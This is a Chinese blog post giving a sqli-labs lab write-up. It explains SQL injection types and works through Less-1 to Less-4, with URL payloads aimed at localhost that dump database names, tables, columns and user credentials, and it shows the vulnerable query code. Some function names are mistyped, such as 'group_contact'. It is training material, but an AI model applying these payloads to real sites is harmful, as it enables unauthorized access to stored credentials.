<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="fzykn06's blog"><meta name="keywords" content="信安, 前端, 后端"><link rel="stylesheet" type="text/css" href="//fonts.loli.net/css?family=Source+Code+Pro"><link rel="stylesheet" type="text/css" href="/css/style.css?v=2.0.4"><link rel="stylesheet" type="text/css" href="/css/highlight.css?v=2.0.4"><link rel="Shortcut Icon" href="/favicon.ico"><link rel="bookmark" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="stylesheet" type="text/css" href="https://unpkg.com/gitalk/dist/gitalk.css?v=2.0.4"><title>sqli-labs-writeup | fzykn06's blog</title><meta name="generator" content="Hexo 4.2.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">sqli-labs-writeup</h1><a id="logo" href="/.">fzykn06's blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div><div id="search-form"><div id="result-mask" class="hide"></div><label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label><div id="result-wrap" class="hide"><div id="search-result"></div></div><div class="hide"><template id="search-tpl"><div class="item"><a href="/{path}" title="{title}"><div class="title">{title}</div><div class="time">{date}</div><div class="tags">{tags}</div></a></div></template></div></div></div><div id="layout" class="layout-g"><div class="layout-l"><div class="content_container"><div class="post"><h1 class="post-title">sqli-labs-writeup</h1><div class="post-meta"><a href="/2019/12/27/sqli-labs-writeup/#comments" class="comment-count"></a><p><span class="date">Dec 27, 2019</span><span><i id="busuanzi_container_page_pv"><i id="busuanzi_value_page_pv"></i><i>点击</i></i></span></p></div><div class="post-content"><p>一直想着要刷这边的题目，但是一直没抽出时间来（留下了没技术的泪水）。现在补上。。。本文采用每题有新知识点就写一个知识点</p>
<p>关卡题目下载链接：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>配置及解题方法参考Lcamry师傅的Mysql注入天书，线上网址：<a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/category/846064.html</a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h2><h3 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h3><ul>
<li>基于错误的sql错误</li>
<li>联合查询的类型</li>
<li>堆查询注射</li>
<li>SQL盲注<ul>
<li>基于布尔SQL盲注</li>
<li>基于时间的SQL盲注</li>
<li>基于报错的SQL盲注</li>
</ul>
</li>
</ul>
<h3 id="基于如何处理输入的SQL查询（数据类型）"><a href="#基于如何处理输入的SQL查询（数据类型）" class="headerlink" title="基于如何处理输入的SQL查询（数据类型）"></a>基于如何处理输入的SQL查询（数据类型）</h3><ul>
<li>基于字符串</li>
<li>基于数字或者整数为基础的</li>
</ul>
<h3 id="基于程度和顺序的注入"><a href="#基于程度和顺序的注入" class="headerlink" title="基于程度和顺序的注入"></a>基于程度和顺序的注入</h3><ul>
<li>一阶注入</li>
<li>二阶注入</li>
</ul>
<p>一阶注入是指输入的注入语句对Web直接产生了影响，出现了结果；二阶注入类似存储型xss，是指输入提交的语句，无法直接对Web应用程序产生影响，通过其他的辅助间接的对Web产生危害。</p>
<p>基于注入点的位置上的</p>
<ul>
<li>通过用户填入的表单域的注入</li>
<li>通过cookie注入</li>
<li>通过服务器变量注入（头部信息）</li>
</ul>
<h2 id="常用知识点"><a href="#常用知识点" class="headerlink" title="常用知识点"></a>常用知识点</h2><h3 id="常用函数："><a href="#常用函数：" class="headerlink" title="常用函数："></a>常用函数：</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">version</span><span class="params">()</span></span>--数据库版本</span><br><span class="line"><span class="function"><span class="title">user</span><span class="params">()</span></span>--数据库用户名</span><br><span class="line"><span class="function"><span class="title">database</span><span class="params">()</span></span>--数据库名</span><br><span class="line">@@datadir--数据库路径</span><br><span class="line">@@version_compile_os--操作系统版本</span><br></pre></td></tr></table></figure>

<h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">contact</span>(<span class="params">str1,str2,...</span>)</span>--没有分隔符的连接字符串</span><br><span class="line"><span class="function"><span class="title">contact_ws</span>(<span class="params">separator,str1,str2,...</span>)</span>--含有分隔符的连接字符串</span><br><span class="line"><span class="function"><span class="title">group_concat</span>(<span class="params">str1,str2,...</span>)</span>--连接这一组的所有字符串，并以逗号隔开每一条数据</span><br><span class="line">#三条都可以一次性查出所有信息</span><br></pre></td></tr></table></figure>

<h3 id="一般的尝试性语句"><a href="#一般的尝试性语句" class="headerlink" title="一般的尝试性语句"></a>一般的尝试性语句</h3><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">'or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">"or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">)or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">')or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">")or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br><span class="line"><span class="comment">"))or</span> <span class="comment">1=1</span> -- <span class="literal">+</span></span><br></pre></td></tr></table></figure>

<p>一般代码为：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/6.png" alt></p>
<p>即：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>此处考虑两个地方，一个是闭合前面的 <code>&#39;</code>,另一个是为了处理后面的<code>&#39;</code>,有两种思路，闭合后面的引号或者直接<code>-- +</code>或者<code>#(%23)</code>注释掉</p>
<h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>union查询用于合并两个及以上select语句的结果集（union内部的select语句必须要有相同数量的列，列也必须要有相似的数据类型且每条select语句中的列的顺序也要相同）。</p>
<h4 id="sql-union语法"><a href="#sql-union语法" class="headerlink" title="sql union语法"></a>sql union语法</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) from table_name1 <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">column_name</span>(<span class="title">s</span>) <span class="title">from</span> <span class="title">table_name2</span></span></span><br></pre></td></tr></table></figure>

<p>默认情况下，union选取的是不同的值，如果要允许重复的值，要使用<code>union all</code></p>
<h4 id="sql-union-all语法"><a href="#sql-union-all语法" class="headerlink" title="sql union all语法"></a>sql union all语法</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name(s) from table_name1 <span class="class"><span class="keyword">union</span> <span class="title">all</span> <span class="title">select</span> <span class="title">column_name</span>(<span class="title">s</span>) <span class="title">from</span> <span class="title">table_name2</span></span></span><br></pre></td></tr></table></figure>

<p>union查询结果中，列名为union中的第一个列名</p>
<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="基础注入"><a href="#基础注入" class="headerlink" title="基础注入"></a>基础注入</h3><h4 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h4><p>题目链接：<a href="http://localhost/sqli-labs-master/Less-1/" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-1/</a></p>
<p>进入页面，看见下面这句话：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>我们在页面中没有看见输入框，应该可以猜测或者你看源码可知道通过构造playload用GET或者POST方式进行注入，向这题，我们打开源码就可以看到是通过GET方式获取的数据</p>
<p><img src="/2019/12/27/sqli-labs-writeup/7.png" alt></p>
<p>于是构造playload：<code>http://localhost/sqli-labs-master/Less-1/?id=1</code></p>
<p>得到：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:Dumb</span><br><span class="line">Your <span class="keyword">Password</span>:Dumb</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/1.png" alt></p>
<p>没有报错出现了一个用户名，在 1 后面添加单引号，即  <code>1&#39;</code> 发现报错：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span> LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>主要的错误点在于<code>&#39;1&#39;&#39; LIMIT 0,1</code> 中添加了一个<code>&#39;</code>,这种方式就是从错误信息中得到我们想要的信息，接下来我们就是要解决这个问题，方法就是在后面添加<code>-- +</code>将后面的内容直接注释掉,于是在后台发送的查询命令就会变为：<code>select **** where id=&#39;1&#39; or 1=1 -- +&#39;LIMIT 0,1</code> 发现没有报错了，尝试order by查询数据库的列数，order by 是对前面的查询数据进行排序。构造<code>http://localhost/sqli-labs-master/Less-1/?id=1&#39; order by 1 -- +</code> 当尝试到4时发现开始报错，这说明在这里只有三列的数据</p>
<p><img src="/2019/12/27/sqli-labs-writeup/2.png" alt></p>
<p>爆出列数，接下来就是用union select进行联合查询，爆出数据库、表、列名：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-1</span>/?id=<span class="number">1</span><span class="string">' union select 1,2,3 -- +</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-1/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_contact(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata<span class="comment">-- +   //获得数据库名security</span></span><br><span class="line">//这边有一个疑问，%<span class="number">23</span>在url编码中是#，如果直接在url输入#不会被编码，以至于会报错，我还没了解到原因然后我改成了<span class="comment">-- + 进行注释后面的内容</span></span><br><span class="line">http://localhost/sqli-labs-master/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="string">' union select 1,2,group_contact(table_name) from information_schema.tables where table_schema= '</span><span class="keyword">security</span><span class="string">'-- +  //获得列表名 user</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-1/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>= <span class="string">'users'</span><span class="comment">-- + //获得列名id,username,password</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/3.png" alt></p>
<p>由此我们已经可以获取到用户信息了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-1/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">3</span> <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/4.png" alt></p>
<p>造成注入的原因分析：</p>
<p>从源码我们得知，sql查询的语句为：<code>select * from users where id = &#39;$id&#39; LIMIT 0,1</code>当服务器获取到被传送的id时直接就放入查询语句进行查询，并没进行id参数过滤，所以当提交<code>or 1=1 -- +</code>就会直接构造sql查询语句<code>select * from users where id=&#39;1&#39; or 1=1 -- + LIMIT 0,1</code>这条查询语句中，<code>or 1=1</code>永远都为真。</p>
<p>当id的数据不存在数据库中时，我们可以使用<code>id=-1</code>,两个sql语句进行联合操作时，当前一个语句为空，就将后面的语句的内容显示出来了，此时前台页面返回的是我们构造的union查询数据。</p>
<h4 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h4><p>进入界面，获得一句话</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>跟less1是一样的，那就先按照less1的步骤来，</p>
<p>构造playload</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-2/?id=1     //没有报错</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-2/?id=1'    //报错</span></span><br></pre></td></tr></table></figure>

<p>//报错的信息为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span> LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>发现和less1的代码有些不太一样，错误提示为<code>&#39;LIMIT 0,1</code>是因为奇数个单引号出发了异常的抛出。</p>
<p>所以在这使用的查询语句应该是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">some</span> <span class="built_in">integer</span> <span class="keyword">value</span>)</span><br></pre></td></tr></table></figure>

<p>所以跟less1是不同的注入方式，尝试不用单引号闭合，而是使用数字进行查询：</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> -- +//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span>-- +   //正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>-- +	//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>-- +	//正常</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=<span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span>-- +	//报错</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata -- + //爆出数据库名<span class="string">'security'</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span><span class="meta">%20union</span><span class="meta">%20select</span><span class="meta">%201</span>,group_concat(table_name),<span class="number">3</span><span class="meta">%20from</span><span class="meta">%20information_schema</span>.tables<span class="meta">%20where</span><span class="meta">%20table_schema</span>=<span class="meta">%27security</span><span class="meta">%27</span><span class="meta">%20--</span><span class="meta">%20</span>+   //获得表名<span class="string">'users'</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span><span class="meta">%20union</span><span class="meta">%20select</span><span class="meta">%201</span>,group_concat(column_name),<span class="number">3</span><span class="meta">%20from</span><span class="meta">%20information_schema</span>.columns<span class="meta">%20where</span><span class="meta">%20table_name</span>=<span class="meta">%27users</span><span class="meta">%27</span><span class="meta">%20--</span><span class="meta">%20</span>+   //获得列名<span class="built_in"> id</span> username password</span><br><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">2</span>/<span class="built_in">?id</span>=-<span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,username,password from users <span class="keyword">where</span><span class="built_in"> id</span>=<span class="number">3</span>-- +	//获得数据</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/5.png" alt></p>
<p>我们查看源码，发现在后台我们发送给数据库查询的代码如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>

<p>发现是没有对<code>id</code>进行处理。所以和less1中就是相差一个单引号，只需要将less1中的playload的<code>&#39;</code>删除就行。</p>
<h4 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h4><p>进入界面仍然是那句话</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>按照less1的方法继续注入</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-3/?id=1</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-3/?id=1' //报错</span></span><br></pre></td></tr></table></figure>

<p>此时返回的报错信息为：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">''</span>1<span class="string">''</span>) LIMIT 0,1<span class="string">' at line 1</span></span><br></pre></td></tr></table></figure>

<p>显然跟上面两个都是一样的，主要的信息为<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
<p>所以查询语句中，应该还有括号没有进行闭合，推出查询语句应该是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">from</span> <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="string">'our input here'</span>)</span><br></pre></td></tr></table></figure>

<p>所以我们要进行括号的闭合采用<code>?id=1&#39;) -- +</code>进行注入</p>
<p><img src="/2019/12/27/sqli-labs-writeup/8.png" alt></p>
<p>然后跟less1注入方式相同，只需在<code>&#39;</code>后面增加<code>)</code>就行，下面是各playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 1 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 2 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 3 <span class="comment">-- +</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4 <span class="comment">-- +//报错</span></span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- +//爆库名</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-3</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' -- +//爆表名</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- +//爆列名</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-3</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,username,password from users where id=3 -- +//获取数据</span></span><br></pre></td></tr></table></figure>

<h4 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h4><p>less4界面与前面的一致，进行尝试性的注入：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>   //正常返回</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>'   //正常返回</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">2</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">3</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span> -- +  //正常</span><br><span class="line">http://localhost/sqli-labs-<span class="literal">master</span>/Less-<span class="number">4</span>/?<span class="attr">id=</span><span class="number">1</span>' <span class="keyword">order</span> <span class="title">by</span> <span class="number">5</span> -- +  //正常</span><br></pre></td></tr></table></figure>

<p>此时我们要注意，我们测试列数到了5还是返回正常，可以尝试一个比较大的数字，发现还是返回正常，说明我们在想法上发生了错误，我们可以在页面的标题中获知double quotes是双引号于是我们将上面的单引号改为双引号进行尝试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">4</span><span class="regexp">/?id=1"</span></span><br></pre></td></tr></table></figure>

<p>此时我们就获取到错误信息：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an <span class="builtin-name">error</span> <span class="keyword">in</span> your SQL syntax; check the<span class="built_in"> manual </span>that corresponds <span class="keyword">to</span> your MySQL<span class="built_in"> server </span>version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="string">'"1"") LIMIT 0,1'</span> at line 1</span><br></pre></td></tr></table></figure>

<p>由此我们可以获知主要的错误在于<code>&quot;1&quot;&quot;)</code>所以代码中对传输的id进行进行<code>&quot;&quot;</code>和<code>()</code>包装，所以在注入是需要进行双引号和括号的闭合。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") <span class="comment">-- + //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 1 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 2 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 3 <span class="comment">-- +  //返回正常</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=1") order by 4 <span class="comment">-- +  //返回错误  //获得列数为3</span></span><br><span class="line">http://localhost/sqli-labs-master/Less-4/?id=-1") union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata <span class="comment">-- + //获取到数据库名security</span></span><br><span class="line"><span class="keyword">http</span>://localhost/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-4</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +  //获取表名 users</span></span><br><span class="line"><span class="string">http://localhost/sqli-labs-master/Less-4/?id=-1"</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">-- + //获取列名id username password</span></span><br><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-4</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">") union select 1,username,password from users where id=3 -- +//获取数据</span></span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注就是在sql注入过程中，sql查询语句执行的选择后，选择的数据无法显示在前端的页面，需要利用一些方法进行判断或者尝试。而盲注一般分为三类：</p>
<ul>
<li><p>基于布尔SQL盲注</p>
</li>
<li><p>基于时间的SQL盲注</p>
</li>
<li><p>基于报错的SQL盲注</p>
</li>
</ul>
